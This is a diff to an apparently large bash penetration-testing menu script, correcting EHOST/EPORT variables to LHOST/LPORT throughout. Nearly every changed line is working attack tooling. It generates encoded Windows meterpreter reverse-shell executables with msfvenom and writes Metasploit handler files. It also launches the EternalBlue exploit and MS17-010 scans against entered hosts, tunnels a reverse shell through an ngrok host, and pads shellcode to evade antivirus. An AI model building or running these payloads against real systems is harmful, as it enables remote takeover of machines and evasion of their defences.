@@ -4527,10 +4527,10 @@ function remote_access
 				fi
 				clear
 				echo -e "LHOST: "
-				read -p $'(\e[4;93mlhost\e[0m)> ' MEHOST
+				read -p $'(\e[4;93mlhost\e[0m)> ' MLHOST
 				clear
 				echo -e "LPORT: "
-				read -p $'(\e[4;93mlport\e[0m)> ' MEPORT
+				read -p $'(\e[4;93mlport\e[0m)> ' MLPORT
 				clear
 				echo -e ""$YS" 1"$CE") CMD                      Smaller size but less features"
 				echo -e ""$YS" 2"$CE") MSF                      Bigger size but more features"
@@ -4584,7 +4584,7 @@ function remote_access
 					MPRT="TCP"
 				fi
 				clear
-				msfpc $MTYPE $MEHOST $MEPORT $MCMDMSF $MBR $MSORS $MPRT
+				msfpc $MTYPE $MLHOST $MLPORT $MCMDMSF $MBR $MSORS $MPRT
 				break
 			done
 		else	
@@ -6250,9 +6250,9 @@ function metasploit_menu
 		echo .
 		if [[ "$TARCH" = "x64" ]]
 		then
-			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai EHOST="$ATIP" EPORT="$ATPORT" -o "$ATEXEPATH"
+			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
 		else
-			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai EHOST="$ATIP" EPORT="$ATPORT" -o "$ATEXEPATH"
+			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
 		fi
 		echo -e "["$YS"inf"$CE"] "$YS"Done"$CE""
 		echo -e ""
@@ -6267,8 +6267,8 @@ function metasploit_menu
 			read -p $'(\e[4;93mname\e[0m)> ' NAMEL
 			echo "use exploit/multi/handler" > "$EPATH"/rc/"$NAMEL".rc
 			echo "set PAYLOAD $PAYLOADL " >> "$EPATH"/rc/"$NAMEL".rc
-			echo "set EHOST $ATIP " >> "$EPATH"/rc/"$NAMEL".rc
-			echo "set EPORT $ATPORT " >> "$EPATH"/rc/"$NAMEL".rc
+			echo "set LHOST $ATIP " >> "$EPATH"/rc/"$NAMEL".rc
+			echo "set LPORT $ATPORT " >> "$EPATH"/rc/"$NAMEL".rc
 			echo "set ExitOnSession false" >> "$EPATH"/rc/"$NAMEL".rc
 			echo "exploit -j" >> "$EPATH"/rc/"$NAMEL".rc
 			clear
@@ -6299,9 +6299,9 @@ function metasploit_menu
 	then
 		clear
 		echo -e "LHOST: "
-		read -p $'(\e[4;93mlhost\e[0m)> ' EHOSTL
+		read -p $'(\e[4;93mlhost\e[0m)> ' LHOSTL
 		echo -e "LPORT: "
-		read -p $'(\e[4;93mlport\e[0m)> ' EPORTL
+		read -p $'(\e[4;93mlport\e[0m)> ' LPORTL
 		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
 		read -p $'(\e[4;93mpayload\e[0m)> ' PAYLOADL
 		if [[ -z "$PAYLOADL" ]]
@@ -6314,8 +6314,8 @@ function metasploit_menu
 		read -p $'(\e[4;93mname\e[0m)> ' NAMEL
 		echo "use exploit/multi/handler" > "$EPATH"/rc/"$NAMEL".rc
 		echo "set PAYLOAD $PAYLOADL " >> "$EPATH"/rc/"$NAMEL".rc
-		echo "set EHOST $EHOSTL " >> "$EPATH"/rc/"$NAMEL".rc
-		echo "set EPORT $EPORTL " >> "$EPATH"/rc/"$NAMEL".rc
+		echo "set LHOST $LHOSTL " >> "$EPATH"/rc/"$NAMEL".rc
+		echo "set LPORT $LPORTL " >> "$EPATH"/rc/"$NAMEL".rc
 		echo "set ExitOnSession false" >> "$EPATH"/rc/"$NAMEL".rc
 		echo "exploit -j" >> "$EPATH"/rc/"$NAMEL".rc
 		clear
@@ -6748,10 +6748,10 @@ function eternalblue
 	else
 		echo -e "LHOST: "
 	fi
-	read -p $'(\e[4;93mlhost\e[0m)> ' EHOSTL
-	if [[ "$EG" != "" && "$EHOSTL" = "" ]]
+	read -p $'(\e[4;93mlhost\e[0m)> ' LHOSTL
+	if [[ "$EG" != "" && "$LHOSTL" = "" ]]
 	then
-		EHOSTL="$EG"
+		LHOSTL="$EG"
 	fi
 	echo -e "RHOST: "
 	read -p $'(\e[4;93mrhost\e[0m)> ' RHOSTL
@@ -6767,7 +6767,7 @@ function eternalblue
 	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
 	read -p $'(\e[4;93mtarget\e[0m)> ' TARGETL
 	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$EPATH"/rce/eternalbluerc.rc
-	echo "set EHOST "$EHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
+	echo "set LHOST "$LHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
 	echo "set RHOST "$RHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
 	echo "set PAYLOAD "$PAYLOADL"" >> "$EPATH"/rce/eternalbluerc.rc
 	echo "set TARGET "$TARGETL"" >> "$EPATH"/rce/eternalbluerc.rc
@@ -8509,7 +8509,7 @@ function ngrok_option
 							fi
 							clear
 							echo -e ""$YS" 1"$CE") Set the Ngrok tcp port              CURRENT:"$NGPORT""
-							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$EPORT""
+							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$LPORT""
 							echo -e ""$YS" b"$CE") Go back"
 							echo -e ""$YS"run"$CE") Make the payload"
 							read -p $'(\e[5;37mconsole\e[0m)> ' RP
@@ -8534,7 +8534,7 @@ function ngrok_option
 										break
 									fi
 								done
-								msfvenom -p windows/meterpreter/reverse_tcp_dns EHOST=0.tcp.ngrok.io EPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
+								msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
 								sleep 2
 								if [[ -f /root/Desktop/"$RAWN".raw ]]
 								then
@@ -8783,27 +8783,27 @@ do
 				elif [[ "$ko" = "e" ]]
 				then
 					n=1
-					totaEHOSTs=""
+					totaLHOSTs=""
 					while [[ "$n" -le "$hostsbackup" ]]
 					do
-						totaEHOSTs=""$totaEHOSTs" "${host["$n"]}""
+						totaLHOSTs=""$totaLHOSTs" "${host["$n"]}""
 						n=$((n+1))
 					done
 					clear
-					if [[ "$totaEHOSTs" = "" || "$totaEHOSTs" = " " ]]
+					if [[ "$totaLHOSTs" = "" || "$totaLHOSTs" = " " ]]
 					then
 						echo -e ""$RS"No hosts found to check"$CE""
 						sleep 2
 						continue
 					fi
-					echo -e ""$BS"RHOSTS"$CE" <- "$totaEHOSTs""
+					echo -e ""$BS"RHOSTS"$CE" <- "$totaLHOSTs""
 					sleep 2
 					if [[ ! -d "$EPATH"/rce ]]
 					then
 						mkdir	"$EPATH"/rce
 					fi
 					echo "use auxiliary/scanner/smb/smb_ms17_010" > "$EPATH"/rce/eternalbluerc.rc
-					echo "set RHOSTS "$totaEHOSTs"" >> "$EPATH"/rce/eternalbluerc.rc
+					echo "set RHOSTS "$totaLHOSTs"" >> "$EPATH"/rce/eternalbluerc.rc
 					echo "exploit" >> "$EPATH"/rce/eternalbluerc.rc
 					echo -e ""$BS"Launching msfconsole. Please wait..."$CE""
 					msfconsole -r "$EPATH"/rce/eternalbluerc.rc
@@ -9470,13 +9470,13 @@ function settings_menu
 }
 function undetectable1
 {
-	EHOST=192.168.1.104
-	EPORT=4444
+	LHOST=192.168.1.104
+	LPORT=4444
 	DIRECTORY="/root/Desktop/shellcode.txt"
 	TXT="/root/Desktop/txt.txt"
 	#############
 	randomshit=$(cat /dev/urandom | tr -dc a-z-A-Z-0-9 | head -c1409)
-	msfvenom -p windows/meterpreter/reverse_tcp EHOST="$EHOST" EPORT="$EPORT" -f c -o "$DIRECTORY"
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f c -o "$DIRECTORY"
 	echo "unsigned char padding[]=" > "$TXT"
 	echo "\"$randomshit\";" >> "$TXT"
 	cat "$DIRECTORY" >> "$TXT"
